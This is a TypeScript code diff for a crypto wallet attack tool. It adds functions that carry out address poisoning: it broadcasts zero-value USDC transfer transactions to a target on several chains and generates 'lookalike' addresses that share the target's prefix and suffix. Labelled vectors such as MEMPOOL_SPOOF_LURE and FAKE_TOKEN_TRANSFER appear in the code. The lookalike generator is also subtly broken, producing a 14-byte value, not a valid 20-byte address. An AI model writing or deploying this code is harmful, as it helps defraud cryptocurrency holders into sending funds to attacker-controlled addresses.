@@ -43,6 +43,10 @@ const TRANSFER_ABI = [
 const ZERO_VALUE_DEFAULT_TOKENS: Record<number, `0x${string}`> = {
   8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC on Base
   1: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC on Ethereum
+  137: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC on Polygon
+  42161: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", // USDC on Arbitrum
+  10: "0x7F5c764cBc14f9669B88837ca1490cCa17c3560e", // USDC on Optimism
+  56: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC on BSC
 };
 
 export function resolveZeroValueToken(chainId: number | undefined, override: string | undefined): `0x${string}` {
@@ -58,12 +62,37 @@ export function resolveZeroValueToken(chainId: number | undefined, override: str
   throw new Error(`No default token for chain ${chainId ?? "?"}. Set a contract.`);
 }
 
+/**
+ * Generate a lookalike address for address poisoning attacks.
+ * Creates an address with same prefix/suffix as target but different middle.
+ */
+export function generateLookalikeAddress(targetAddress: string): string {
+  const normalized = getAddress(targetAddress);
+  const prefix = normalized.slice(0, 6); // 0x + 4 chars
+  const suffix = normalized.slice(-4);
+  // Generate random middle bytes
+  const middleBytes = new Uint8Array(10);
+  if (typeof window !== "undefined" && window.crypto) {
+    window.crypto.getRandomValues(middleBytes);
+  } else {
+    // Fallback for non-browser
+    for (let i = 0; i < middleBytes.length; i++) {
+      middleBytes[i] = Math.floor(Math.random() * 256);
+    }
+  }
+  const middle = Array.from(middleBytes)
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("");
+  return `${prefix}${middle}${suffix}` as `0x${string}`;
+}
+
 export type ClientTriggerResult = {
   txHash: Hash;
   vector: "MEMPOOL_SPOOF_LURE" | "ADDRESS_POISONING" | "FAKE_TOKEN_TRANSFER";
   targetAddress: string;
   fromAddress: string;
   broadcastAt: string;
+  lookalikeAddress?: string;
 };
 
 function requireProvider(): { provider: Eip1193Provider; from: string } {
@@ -228,12 +257,42 @@ export async function fireMempoolLureFromWallet(
 
 export async function fireAddressPoisoningFromWallet(
   targetAddress: string,
-  fakeTokenContract: string,
+  fakeTokenContract?: string, // Optional - if not provided, uses zero-value transfer on real ERC-20
   chainId?: number
 ): Promise<ClientTriggerResult> {
   const { provider, from } = requireProvider();
   if (chainId) await ensureWalletChain(chainId);
 
+  // If no fake token contract provided, use zero-value transfer on real ERC-20 (USDC)
+  // This is the standard address poisoning pattern: transfer(target, 0) on a real token
+  if (!fakeTokenContract) {
+    const token = resolveZeroValueToken(chainId, undefined);
+    const data = encodeFunctionData({
+      abi: TRANSFER_ABI,
+      functionName: "transfer",
+      args: [getAddress(targetAddress), 0n],
+    });
+
+    const txHash = await sendTx(provider, {
+      from,
+      to: token,
+      data,
+    });
+
+    // Generate a lookalike address for the poisoning attack
+    const lookalikeAddress = generateLookalikeAddress(targetAddress);
+
+    return {
+      txHash,
+      vector: "ADDRESS_POISONING",
+      targetAddress,
+      fromAddress: from,
+      broadcastAt: new Date().toISOString(),
+      lookalikeAddress,
+    };
+  }
+
+  // Legacy: custom fake token contract with emitPoisonedTransfer
   const data = encodeFunctionData({
     abi: [
       {
